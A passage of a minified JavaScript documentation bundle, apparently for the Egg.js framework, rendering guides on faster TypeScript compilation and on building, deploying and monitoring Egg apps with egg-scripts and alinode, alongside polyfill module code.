references:"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg"},"https://github.com/eggjs/egg")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-view"},"https://github.com/eggjs/egg-view")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-logger"},"https://github.com/eggjs/egg-logger"))),r.a.createElement("h3",{id:"slow-compilation"},r.a.createElement(l["AnchorLink"],{to:"#slow-compilation","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Slow Compilation?"),r.a.createElement("p",null,"According to our practice, ts-node is a better solution nowaday because we don't execute tsc in a new terminal, and we can accept the start speed (only for ts-node@7, because the new version has removed the cache and it makes the speed too slow (",r.a.createElement(l["Link"],{to:"https://github.com/TypeStrong/ts-node/issues/754"},"#754"),"), so that's why we don't upgrade it)."),r.a.createElement("p",null,"But if your project is extreamly huge, ts-node's performance will be tight as well. So here're our optimizations for you:"),r.a.createElement("h4",{id:"close-typecheck"},r.a.createElement(l["AnchorLink"],{to:"#close-typecheck","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Close typecheck"),r.a.createElement("p",null,"Most of time in compilation is type checking, so if we close it there'll be a bit improvements for performance, with the environment variable",r.a.createElement("code",null,"TS_NODE_TRANSPILE_ONLY=true")," when starting your app. E.g:"),r.a.createElement(o["a"],{code:"$ TS_NODE_TRANSPILE_ONLY=true egg-bin dev",lang:"bash"}),r.a.createElement("p",null,'Or you can just make tscompiler as the "Compiling-Only" for tscompiler.'),r.a.createElement(o["a"],{code:'// package.json\n{\n  "name": "demo",\n  "egg": {\n    "typescript": true,\n    "declarations": true,\n    "tscompiler": "ts-node/register/transpile-only"\n  }\n}',lang:"json"}),r.a.createElement("h4",{id:"switch-for-a-high-efficient-compiler"},r.a.createElement(l["AnchorLink"],{to:"#switch-for-a-high-efficient-compiler","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Switch for a high efficient compiler"),r.a.createElement("p",null,"Besides ts-node, There're also many projects supporting ts compilation, such as esbuild, we can install it first ",r.a.createElement(l["Link"],{to:"https://github.com/egoist/esbuild-register"},"esbuild-register")),r.a.createElement(o["a"],{code:"$ npm install esbuild-register --save-dev",lang:"bash"}),r.a.createElement("p",null,"And then config ",r.a.createElement("code",null,"tscompiler")," like this:"),r.a.createElement(o["a"],{code:'// package.json\n{\n  "name": "demo",\n  "egg": {\n    "typescript": true,\n    "declarations": true,\n    "tscompiler": "esbuild-register"\n  }\n}',lang:"json"}),r.a.createElement("p",null,"Then you can use esbuild-register to compile (notice: esbulild-register can't do typecheck)."),r.a.createElement("blockquote",null,r.a.createElement("p",null,"Same for swc, if you want to use it after installation ",r.a.createElement(l["Link"],{to:"https://github.com/Brooooooklyn/swc-node#swc-noderegister"},"@swc-node/register"),", and then config in tscompiler.")),r.a.createElement("h4",{id:"use-tsc"},r.a.createElement(l["AnchorLink"],{to:"#use-tsc","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Use tsc"),r.a.createElement("p",null,"If you still cannot bear the speed of the dynamic compilation, you can directly use tsc. This means you don't need to config typescript to true in package.json, but just start a new terminal to execute tsc."),r.a.createElement(o["a"],{code:"$ tsc -w",lang:"bash"}),r.a.createElement("p",null,"And then start the egg."),r.a.createElement(o["a"],{code:"$ egg-bin dev",lang:"bash"}),r.a.createElement("p",null,"We suggest you can add configs for ",r.a.createElement("code",null,"**/*.js")," at .gitignore to avoid submitting the generated js files to the remote.")))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(i,{demos:n})}},ouRp:function(e,t,n){var a=n("0mt+"),r=n("JH4+");a({target:"WeakMap",stat:!0},{of:r})},oyD1:function(e,t,n){var a=n("a7jj");e.exports=function(e){if(!a(e))throw TypeError(String(e)+" is not an object");return e}},pBhg:function(e,t,n){"use strict";var a=n("MAgz"),r=a.aTypedArray,l=a.exportTypedArrayMethod,o=[].sort;l("sort",(function(e){return o.call(r(this),e)}))},pX0n:function(e,t){e.exports={}},pa1g:function(e,t,n){"use strict";var a,r,l,o=n("Yftc"),i=n("XExY"),c=n("31yA"),s=n("q7Pv"),u=n("m4/z"),d=s("iterator"),m=!1,p=function(){return this};[].keys&&(l=[].keys(),"next"in l?(r=o(o(l)),r!==Object.prototype&&(a=r)):m=!0),void 0==a&&(a={}),u||c(a,d)||i(a,d,p),e.exports={IteratorPrototype:a,BUGGY_SAFARI_ITERATORS:m}},paKd:function(e,t,n){"use strict";n.d(t,"b",(function(){return i}));var a=n("FU0I"),r=n("d9lq"),l=Object(r["a"])()?a["useLayoutEffect"]:a["useEffect"],o=function(e,t){var n=a["useRef"](!0);l((function(){return e(n.current)}),t),l((function(){return n.current=!1,function(){n.current=!0}}),[])},i=function(e,t){o((function(t){if(!t)return e()}),t)};t["a"]=o},q1BL:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,"\u5728",r.a.createElement(l["Link"],{to:"./development"},"\u672c\u5730\u5f00\u53d1"),"\u65f6\uff0c\u6211\u4eec\u4f7f\u7528 ",r.a.createElement("code",null,"egg-bin dev")," \u6765\u542f\u52a8\u670d\u52a1\uff0c\u4f46\u662f\u5728\u90e8\u7f72\u5e94\u7528\u7684\u65f6\u5019\u4e0d\u53ef\u4ee5\u8fd9\u6837\u4f7f\u7528\u3002\u56e0\u4e3a ",r.a.createElement("code",null,"egg-bin dev")," \u4f1a\u9488\u5bf9\u672c\u5730\u5f00\u53d1\u505a\u5f88\u591a\u5904\u7406\uff0c\u800c\u751f\u4ea7\u8fd0\u884c\u9700\u8981\u4e00\u4e2a\u66f4\u52a0\u7b80\u5355\u7a33\u5b9a\u7684\u65b9\u5f0f\u3002\u6240\u4ee5\u672c\u7ae0\u4e3b\u8981\u8bb2\u89e3\u5982\u4f55\u90e8\u7f72\u4f60\u7684\u5e94\u7528\u3002"),r.a.createElement("p",null,"\u4e00\u822c\u4ece\u6e90\u7801\u4ee3\u7801\u5230\u771f\u6b63\u8fd0\u884c\uff0c\u6211\u4eec\u4f1a\u62c6\u5206\u6210\u6784\u5efa\u548c\u90e8\u7f72\u4e24\u6b65\uff0c\u53ef\u4ee5\u505a\u5230",r.a.createElement("strong",null,"\u4e00\u6b21\u6784\u5efa\u591a\u6b21\u90e8\u7f72"),"\u3002"),r.a.createElement("h2",{id:"\u6784\u5efa"},r.a.createElement(l["AnchorLink"],{to:"#\u6784\u5efa","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u6784\u5efa"),r.a.createElement("p",null,"JavaScript \u8bed\u8a00\u672c\u8eab\u4e0d\u9700\u8981\u7f16\u8bd1\u7684\uff0c\u6784\u5efa\u8fc7\u7a0b\u4e3b\u8981\u662f\u4e0b\u8f7d\u4f9d\u8d56\u3002\u4f46\u5982\u679c\u4f7f\u7528 TypeScript \u6216\u8005 Babel \u652f\u6301 ES6 \u4ee5\u4e0a\u7684\u7279\u6027\uff0c\u90a3\u5c31\u5fc5\u987b\u8981\u8fd9\u4e00\u6b65\u4e86\u3002"),r.a.createElement("p",null,"\u4e00\u822c\u5b89\u88c5\u4f9d\u8d56\u4f1a\u6307\u5b9a ",r.a.createElement("code",null,"NODE_ENV=production")," \u6216 ",r.a.createElement("code",null,"npm install --production")," \u53ea\u5b89\u88c5 dependencies \u7684\u4f9d\u8d56\u3002\u56e0\u4e3a devDependencies \u4e2d\u7684\u6a21\u5757\u8fc7\u5927\u800c\u4e14\u5728\u751f\u4ea7\u73af\u5883\u4e0d\u4f1a\u4f7f\u7528\uff0c\u5b89\u88c5\u540e\u4e5f\u53ef\u80fd\u9047\u5230\u672a\u77e5\u95ee\u9898\u3002"),r.a.createElement(o["a"],{code:"$ cd baseDir\n$ npm install --production\n$ tar -zcvf ../release.tgz .",lang:"bash"}),r.a.createElement("p",null,"\u6784\u5efa\u5b8c\u6210\u540e\u6253\u5305\u6210 tgz \u6587\u4ef6\uff0c\u90e8\u7f72\u7684\u65f6\u5019\u89e3\u538b\u542f\u52a8\u5c31\u53ef\u4ee5\u4e86\u3002"),r.a.createElement("p",null,"\u589e\u52a0\u6784\u5efa\u73af\u8282\u624d\u80fd\u505a\u5230\u771f\u6b63\u7684",r.a.createElement("strong",null,"\u4e00\u6b21\u6784\u5efa\u591a\u6b21\u90e8\u7f72"),"\uff0c\u7406\u8bba\u4e0a\u4ee3\u7801\u6ca1\u6709\u6539\u52a8\u7684\u65f6\u5019\u662f\u4e0d\u9700\u8981\u518d\u6b21\u6784\u5efa\u7684\uff0c\u53ef\u4ee5\u7528\u539f\u6765\u7684\u5305\u8fdb\u884c\u90e8\u7f72\uff0c\u8fd9\u6709\u7740\u4e0d\u5c11\u597d\u5904\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u6784\u5efa\u4f9d\u8d56\u7684\u73af\u5883\u548c\u8fd0\u884c\u65f6\u662f\u6709\u5dee\u5f02\u7684\uff0c\u6240\u4ee5\u4e0d\u8981\u6c61\u67d3\u8fd0\u884c\u65f6\u73af\u5883\u3002"),r.a.createElement("li",null,"\u53ef\u4ee5\u51cf\u5c11\u53d1\u5e03\u7684\u65f6\u95f4\uff0c\u800c\u4e14\u6613\u56de\u6eda\uff0c\u53ea\u9700\u8981\u628a\u539f\u6765\u7684\u5305\u91cd\u65b0\u542f\u52a8\u5373\u53ef\u3002")),r.a.createElement("h2",{id:"\u90e8\u7f72"},r.a.createElement(l["AnchorLink"],{to:"#\u90e8\u7f72","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u90e8\u7f72"),r.a.createElement("p",null,"\u670d\u52a1\u5668\u9700\u8981\u9884\u88c5 Node.js\uff0c\u6846\u67b6\u652f\u6301\u7684 Node \u7248\u672c\u4e3a ",r.a.createElement("code",null,">= 14.20.0"),"\u3002"),r.a.createElement("p",null,"\u6846\u67b6\u5185\u7f6e\u4e86 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-cluster"},"egg-cluster")," \u6765\u542f\u52a8 ",r.a.createElement(l["AnchorLink"],{to:"./cluster-and-ipc#master"},"Master \u8fdb\u7a0b"),"\uff0cMaster \u6709\u8db3\u591f\u7684\u7a33\u5b9a\u6027\uff0c\u4e0d\u518d\u9700\u8981\u4f7f\u7528 ",r.a.createElement(l["Link"],{to:"https://github.com/Unitech/pm2"},"pm2")," \u7b49\u8fdb\u7a0b\u5b88\u62a4\u6a21\u5757\u3002"),r.a.createElement("p",null,"\u540c\u65f6\uff0c\u6846\u67b6\u4e5f\u63d0\u4f9b\u4e86 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-scripts"},"egg-scripts")," \u6765\u652f\u6301\u7ebf\u4e0a\u73af\u5883\u7684\u8fd0\u884c\u548c\u505c\u6b62\u3002"),r.a.createElement("p",null,"\u9996\u5148\uff0c\u6211\u4eec\u9700\u8981\u628a ",r.a.createElement("code",null,"egg-scripts")," \u6a21\u5757\u4f5c\u4e3a ",r.a.createElement("code",null,"dependencies")," \u5f15\u5165\uff1a"),r.a.createElement(o["a"],{code:"$ npm i egg-scripts --save",lang:"bash"}),r.a.createElement("p",null,"\u6dfb\u52a0 ",r.a.createElement("code",null,"npm scripts")," \u5230 ",r.a.createElement("code",null,"package.json"),"\uff1a"),r.a.createElement(o["a"],{code:'{\n  "scripts": {\n    "start": "egg-scripts start --daemon",\n    "stop": "egg-scripts stop"\n  }\n}',lang:"json"}),r.a.createElement("p",null,"\u8fd9\u6837\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7 ",r.a.createElement("code",null,"npm start")," \u548c ",r.a.createElement("code",null,"npm stop")," \u547d\u4ee4\u542f\u52a8\u6216\u505c\u6b62\u5e94\u7528\u3002"),r.a.createElement("blockquote",null,r.a.createElement("p",null,"\u6ce8\u610f\uff1a",r.a.createElement("code",null,"egg-scripts")," \u5bf9 Windows \u7cfb\u7edf\u7684\u652f\u6301\u6709\u9650\uff0c\u53c2\u89c1 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-scripts/pull/22"},"#22"),"\u3002")),r.a.createElement("h3",{id:"\u542f\u52a8\u547d\u4ee4"},r.a.createElement(l["AnchorLink"],{to:"#\u542f\u52a8\u547d\u4ee4","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u542f\u52a8\u547d\u4ee4"),r.a.createElement(o["a"],{code:"$ egg-scripts start --port=7001 --daemon --title=egg-server-showcase",lang:"bash"}),r.a.createElement("p",null,"\u5982\u4e0a\u793a\u4f8b\uff0c\u652f\u6301\u4ee5\u4e0b\u53c2\u6570\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("p",null,r.a.createElement("code",null,"--port=7001")," \u7aef\u53e3\u53f7\uff0c\u9ed8\u8ba4\u4f1a\u8bfb\u53d6\u73af\u5883\u53d8\u91cf ",r.a.createElement("code",null,"process.env.PORT"),"\uff0c\u5982\u672a\u4f20\u9012\u5c06\u4f7f\u7528\u6846\u67b6\u5185\u7f6e\u7aef\u53e3 ",r.a.createElement("code",null,"7001"),"\u3002")),r.a.createElement("li",null,r.a.createElement("p",null,r.a.createElement("code",null,"--daemon")," \u662f\u5426\u5141\u8bb8\u5728\u540e\u53f0\u6a21\u5f0f\uff0c\u65e0\u9700 ",r.a.createElement("code",null,"nohup"),"\u3002\u82e5\u4f7f\u7528 Docker \u5efa\u8bae\u76f4\u63a5\u524d\u53f0\u8fd0\u884c\u3002")),r.a.createElement("li",null,r.a.createElement("p",null,r.a.createElement("code",null,"--env=prod")," \u6846\u67b6\u8fd0\u884c\u73af\u5883\uff0c\u9ed8\u8ba4\u4f1a\u8bfb\u53d6\u73af\u5883\u53d8\u91cf ",r.a.createElement("code",null,"process.env.EGG_SERVER_ENV"),"\uff0c \u5982\u672a\u4f20\u9012\u5c06\u4f7f\u7528\u6846\u67b6\u5185\u7f6e\u73af\u5883 ",r.a.createElement("code",null,"prod"),"\u3002")),r.a.createElement("li",null,r.a.createElement("p",null,r.a.createElement("code",null,"--workers=2")," \u6846\u67b6 worker \u7ebf\u7a0b\u6570\uff0c\u9ed8\u8ba4\u4f1a\u521b\u5efa\u548c CPU \u6838\u6570\u76f8\u5f53\u7684 app worker \u6570\uff0c\u53ef\u4ee5\u5145\u5206\u7684\u5229\u7528 CPU \u8d44\u6e90\u3002")),r.a.createElement("li",null,r.a.createElement("p",null,r.a.createElement("code",null,"--title=egg-server-showcase")," \u7528\u4e8e\u65b9\u4fbf ps \u8fdb\u7a0b\u65f6 grep \u7528\uff0c\u9ed8\u8ba4\u4e3a ",r.a.createElement("code",null,"egg-server-$","{","appname","}"),"\u3002")),r.a.createElement("li",null,r.a.createElement("p",null,r.a.createElement("code",null,"--framework=yadan")," \u5982\u679c\u5e94\u7528\u4f7f\u7528\u4e86",r.a.createElement(l["Link"],{to:"../advanced/framework"},"\u81ea\u5b9a\u4e49\u6846\u67b6"),"\uff0c\u53ef\u4ee5\u914d\u7f6e ",r.a.createElement("code",null,"package.json")," \u7684 ",r.a.createElement("code",null,"egg.framework")," \u6216\u6307\u5b9a\u8be5\u53c2\u6570\u3002")),r.a.createElement("li",null,r.a.createElement("p",null,r.a.createElement("code",null,"--ignore-stderr")," \u5ffd\u7565\u542f\u52a8\u671f\u7684\u62a5\u9519\u3002")),r.a.createElement("li",null,r.a.createElement("p",null,r.a.createElement("code",null,"--https.key")," \u6307\u5b9a HTTPS \u6240\u9700\u5bc6\u94a5\u6587\u4ef6\u7684\u5b8c\u6574\u8def\u5f84\u3002")),r.a.createElement("li",null,r.a.createElement("p",null,r.a.createElement("code",null,"--https.cert")," \u6307\u5b9a HTTPS \u6240\u9700\u8bc1\u4e66\u6587\u4ef6\u7684\u5b8c\u6574\u8def\u5f84\u3002")),r.a.createElement("li",null,r.a.createElement("p",null,"\u6240\u6709 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-cluster"},"egg-cluster")," \u7684 Options \u90fd\u652f\u6301\u900f\u4f20\uff0c\u5982 ",r.a.createElement("code",null,"--port")," \u7b49\u3002"))),r.a.createElement("p",null,"\u66f4\u591a\u53c2\u6570\u53ef\u67e5\u770b ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-scripts"},"egg-scripts")," \u548c ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-cluster"},"egg-cluster")," \u6587\u6863\u3002"),r.a.createElement("h4",{id:"\u542f\u52a8\u914d\u7f6e\u9879"},r.a.createElement(l["AnchorLink"],{to:"#\u542f\u52a8\u914d\u7f6e\u9879","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u542f\u52a8\u914d\u7f6e\u9879"),r.a.createElement("p",null,"\u4f60\u4e5f\u53ef\u4ee5\u5728 ",r.a.createElement("code",null,"config.","{","env","}",".js")," \u4e2d\u914d\u7f6e\u6307\u5b9a\u542f\u52a8\u914d\u7f6e\u3002"),r.a.createElement(o["a"],{code:"// config/config.default.js\n\nexports.cluster = {\n  listen: {\n    port: 7001,\n    hostname: '127.0.0.1', // \u4e0d\u5efa\u8bae\u8bbe\u7f6e hostname \u4e3a '0.0.0.0'\uff0c\u5b83\u5c06\u5141\u8bb8\u6765\u81ea\u5916\u90e8\u7f51\u7edc\u548c\u6765\u6e90\u7684\u8fde\u63a5\uff0c\u8bf7\u5728\u77e5\u6653\u98ce\u9669\u7684\u60c5\u51b5\u4e0b\u4f7f\u7528\n    // path: '/var/run/egg.sock',\n  },\n};",lang:"js"}),r.a.createElement("p",null,r.a.createElement("code",null,"path"),"\uff0c",r.a.createElement("code",null,"port"),"\uff0c",r.a.createElement("code",null,"hostname")," \u5747\u4e3a ",r.a.createElement(l["Link"],{to:"https://nodejs.org/api/http.html#http_server_listen_port_hostname_backlog_callback"},"server.listen")," \u7684\u53c2\u6570\uff0c",r.a.createElement("code",null,"egg-scripts")," \u548c ",r.a.createElement("code",null,"egg.startCluster")," \u65b9\u6cd5\u4f20\u5165\u7684 port \u4f18\u5148\u7ea7\u9ad8\u4e8e\u6b64\u914d\u7f6e\u3002"),r.a.createElement("h3",{id:"\u505c\u6b62\u547d\u4ee4"},r.a.createElement(l["AnchorLink"],{to:"#\u505c\u6b62\u547d\u4ee4","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u505c\u6b62\u547d\u4ee4"),r.a.createElement(o["a"],{code:"$ egg-scripts stop [--title=egg-server]",lang:"bash"}),r.a.createElement("p",null,"\u8be5\u547d\u4ee4\u5c06\u6740\u6b7b master \u8fdb\u7a0b\uff0c\u5e76\u901a\u77e5 worker \u548c agent \u4f18\u96c5\u9000\u51fa\u3002"),r.a.createElement("p",null,"\u652f\u6301\u4ee5\u4e0b\u53c2\u6570\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"--title=egg-server")," \u7528\u4e8e\u6740\u6b7b\u6307\u5b9a\u7684 egg \u5e94\u7528\uff0c\u672a\u4f20\u9012\u5219\u4f1a\u7ec8\u6b62\u6240\u6709\u7684 Egg \u5e94\u7528\u3002")),r.a.createElement("p",null,"\u4f60\u4e5f\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7 ",r.a.createElement("code",null,'ps -eo "pid,command" | grep -- "--title=egg-server"')," \u6765\u627e\u5230 master \u8fdb\u7a0b\uff0c\u5e76 ",r.a.createElement("code",null,"kill")," \u6389\uff0c\u65e0\u9700 ",r.a.createElement("code",null,"kill -9"),"\u3002"),r.a.createElement("h2",{id:"\u76d1\u63a7"},r.a.createElement(l["AnchorLink"],{to:"#\u76d1\u63a7","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u76d1\u63a7"),r.a.createElement("p",null,"\u6211\u4eec\u8fd8\u9700\u8981\u5bf9\u670d\u52a1\u8fdb\u884c\u6027\u80fd\u76d1\u63a7\uff0c\u5185\u5b58\u6cc4\u9732\u5206\u6790\uff0c\u6545\u969c\u6392\u9664\u7b49\u3002"),r.a.createElement("p",null,"\u4e1a\u754c\u5e38\u7528\u7684\u6709\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://www.aliyun.com/product/nodejs"},"Node.js \u6027\u80fd\u5e73\u53f0\uff08alinode\uff09")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://nodesource.com/products/nsolid/"},"NSolid"))),r.a.createElement("h3",{id:"nodejs-\u6027\u80fd\u5e73\u53f0alinode"},r.a.createElement(l["AnchorLink"],{to:"#nodejs-\u6027\u80fd\u5e73\u53f0alinode","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Node.js \u6027\u80fd\u5e73\u53f0\uff08alinode\uff09"),r.a.createElement("p",null,r.a.createElement("strong",null,"\u6ce8\u610f\uff1a")," Node.js \u6027\u80fd\u5e73\u53f0 (alinode) \u76ee\u524d\u4ec5\u652f\u6301 macOS \u548c Linux\uff0c\u4e0d\u652f\u6301 Windows\u3002"),r.a.createElement("p",null,r.a.createElement(l["Link"],{to:"https://www.aliyun.com/product/nodejs"},"Node.js \u6027\u80fd\u5e73\u53f0")," \u662f\u9762\u5411\u6240\u6709 Node.js \u5e94\u7528\u63d0\u4f9b ",r.a.createElement("code",null,"\u6027\u80fd\u76d1\u63a7\u3001\u5b89\u5168\u63d0\u9192\u3001\u6545\u969c\u6392\u67e5\u3001\u6027\u80fd\u4f18\u5316")," \u7b49\u670d\u52a1\u7684\u6574\u4f53\u6027\u89e3\u51b3\u65b9\u6848\uff0c\u63d0\u4f9b\u5b8c\u5584\u7684\u5de5\u5177\u94fe\u548c\u670d\u52a1\uff0c\u534f\u52a9\u5f00\u53d1\u8005\u5feb\u901f\u53d1\u73b0\u548c\u5b9a\u4f4d\u7ebf\u4e0a\u95ee\u9898\u3002"),r.a.createElement("h4",{id:"\u5b89\u88c5-runtime"},r.a.createElement(l["AnchorLink"],{to:"#\u5b89\u88c5-runtime","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5b89\u88c5 Runtime"),r.a.createElement("p",null,"AliNode Runtime \u53ef\u4ee5\u76f4\u63a5\u66ff\u6362\u6389 Node.js Runtime\uff0c\u5bf9\u5e94\u7248\u672c\u53c2\u89c1",r.a.createElement(l["Link"],{to:"https://help.aliyun.com/knowledge_detail/60811.html"},"\u6587\u6863"),"\u3002"),r.a.createElement("p",null,"\u5168\u5c40\u5b89\u88c5\u65b9\u5f0f\u53c2\u89c1",r.a.createElement(l["Link"],{to:"https://help.aliyun.com/document_detail/60338.html"},"\u6587\u6863"),"\u3002"),r.a.createElement("p",null,"\u6709\u65f6\u5019\uff0c\u540c\u65f6\u90e8\u7f72\u591a\u4e2a\u9879\u76ee\uff0c\u671f\u671b\u591a\u7248\u672c\u5171\u5b58\u65f6\uff0c\u5219\u53ef\u4ee5\u628a Runtime \u5b89\u88c5\u5230\u5f53\u524d\u9879\u76ee\uff1a"),r.a.createElement(o["a"],{code:"$ npm i nodeinstall -g\n$ nodeinstall --install-alinode ^3",lang:"bash"}),r.a.createElement("p",null,r.a.createElement(l["Link"],{to:"https://github.com/cnpm/nodeinstall"},"nodeinstall")," \u4f1a\u628a\u5bf9\u5e94\u7248\u672c\u7684 ",r.a.createElement("code",null,"alinode")," \u5b89\u88c5\u5230\u9879\u76ee\u7684 ",r.a.createElement("code",null,"node_modules")," \u76ee\u5f55\u4e0b\u3002"),r.a.createElement("blockquote",null,r.a.createElement("p",null,"\u6ce8\u610f\uff1a\u6253\u5305\u673a\u7684\u64cd\u4f5c\u7cfb\u7edf\u548c\u7ebf\u4e0a\u7cfb\u7edf\u9700\u4fdd\u6301\u4e00\u81f4\uff0c\u5426\u5219\u5bf9\u5e94\u7684 Runtime \u4e0d\u4e00\u5b9a\u80fd\u6b63\u5e38\u8fd0\u884c\u3002")),r.a.createElement("h4",{id:"\u5b89\u88c5\u53ca\u914d\u7f6e"},r.a.createElement(l["AnchorLink"],{to:"#\u5b89\u88c5\u53ca\u914d\u7f6e","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5b89\u88c5\u53ca\u914d\u7f6e"),r.a.createElement("p",null,"\u6211\u4eec\u63d0\u4f9b\u4e86 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-alinode"},"egg-alinode")," \u6765\u5feb\u901f\u63a5\u5165\uff0c\u65e0\u9700\u5b89\u88c5 ",r.a.createElement("code",null,"agenthub")," \u7b49\u989d\u5916\u7684\u5e38\u9a7b\u670d\u52a1\u3002"),r.a.createElement("p",null,r.a.createElement("strong",null,"\u5b89\u88c5\u4f9d\u8d56\uff1a")),r.a.createElement(o["a"],{code:"$ npm i egg-alinode --save",lang:"bash"}),r.a.createElement("p",null,r.a.createElement("strong",null,"\u5f00\u542f\u63d2\u4ef6\uff1a")),r.a.createElement(o["a"],{code:"// config/plugin.js\nexports.alinode = {\n  enable: true,\n  package: 'egg-alinode',\n};",lang:"js"}),r.a.createElement("p",null,r.a.createElement("strong",null,"\u914d\u7f6e\uff1a")),r.a.createElement(o["a"],{code:"// config/config.default.js\nexports.alinode = {\n  // \u4ece `Node.js \u6027\u80fd\u5e73\u53f0` \u83b7\u53d6\u5bf9\u5e94\u7684\u63a5\u5165\u53c2\u6570\n  appid: '<YOUR_APPID>',\n  secret: '<YOUR_SECRET>',\n};",lang:"js"}),r.a.createElement("h3",{id:"\u542f\u52a8\u5e94\u7528"},r.a.createElement(l["AnchorLink"],{to:"#\u542f\u52a8\u5e94\u7528","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u542f\u52a8\u5e94\u7528"),r.a.createElement("p",null,r.a.createElement("code",null,"npm scripts")," \u914d\u7f6e\u7684 ",r.a.createElement("code",null,"start")," \u6307\u4ee4\u65e0\u9700\u6539\u53d8\uff0c\u901a\u8fc7 ",r.a.createElement("code",null,"egg-scripts")," \u5373\u53ef\u3002"),r.a.createElement("p",null,"\u542f\u52a8\u547d\u4ee4\u9700\u4f7f\u7528 ",r.a.createElement("code",null,"npm start"),"\uff0c\u56e0\u4e3a ",r.a.createElement("code",null,"npm scripts")," \u6267\u884c\u65f6\u4f1a\u628a ",r.a.createElement("code",null,"node_module/.bin")," \u76ee\u5f55\u52a0\u5165 ",r.a.createElement("code",null,"PATH"),"\uff0c\u6545\u4f1a\u4f18\u5148\u4f7f\u7528\u5f53\u524d\u9879\u76ee\u6267\u884c\u7684 Node \u7248\u672c\u3002"),r.a.createElement("p",null,"\u542f\u52a8\u540e\u4f1a\u770b\u5230 master \u65e5\u5fd7\u5305\u542b\u4ee5\u4e0b\u5185\u5bb9\uff1a"),r.a.createElement(o["a"],{code:"$ [master] node version v8.9.4\n$ [master] alinode version v3.8.4\n$ [Tue Aug 06 2019 15:54:25 GMT+0800 (China Standard Time)] Connecting to wss://agentserver.node.aliyun.com:8080...\n$ [Tue Aug 06 2019 15:54:26 GMT+0800 (China Standard Time)] agent register ok.",lang:"bash"}),r.a.createElement("p",null,"\u5176\u4e2d ",r.a.createElement("code",null,"agent register ok.")," \u8868\u793a\u914d\u7f6e\u7684 ",r.a.createElement("code",null,"egg-alinode")," \u6b63\u786e\u8fde\u63a5\u4e0a\u4e86 Node.js \u6027\u80fd\u5e73\u53f0\u670d\u52a1\u5668\u3002"),r.a.createElement("h4",{id:"\u8bbf\u95ee\u63a7\u5236\u53f0"},r.a.createElement(l["AnchorLink"],{to:"#\u8bbf\u95ee\u63a7\u5236\u53f0","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u8bbf\u95ee\u63a7\u5236\u53f0"),r.a.createElement("p",null,"\u63a7\u5236\u53f0\u5730\u5740\uff1a",r.a.createElement(l["Link"],{to:"https://node.console.aliyun.com/"},"https://node.console.aliyun.com"))))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(i,{demos:n})}},q7Pv:function(e,t,n){var a=n("A0UU"),r=n("jAHp"),l=n("31yA"),o=n("vbCh"),i=n("XS8S"),c=n("ysnP"),s=r("wks"),u=a.Symbol,d=c?u:u&&u.withoutSetter||o;e.exports=function(e){return l(s,e)||(i&&l(u,e)?s[e]=u[e]:s[e]=d("Symbol."+e)),s[e]}},qEhY:function(e,t,n){"use strict";var a=n("SCbZ"),r=n("tS9j");e.exports="".repeat||function(e){var t=String(r(this)),n="",l=a(e);if(l<0||l==1/0)throw RangeError("Wrong number of repetitions");for(;l>0;(l>>>=1)&&(t+=t))1&l&&(n+=t);return n}},qFz4:function(e,t,n){var a=n("0mt+"),r=n("V3tB"),l=n("XaNN"),o=n("oyD1"),i=n("a7jj"),c=n("tbdv"),s=n("UJM+"),u=n("Xdqv"),d=r("Reflect","construct"),m=u((function(){function e(){}return!(d((function(){}),[],e)instanceof 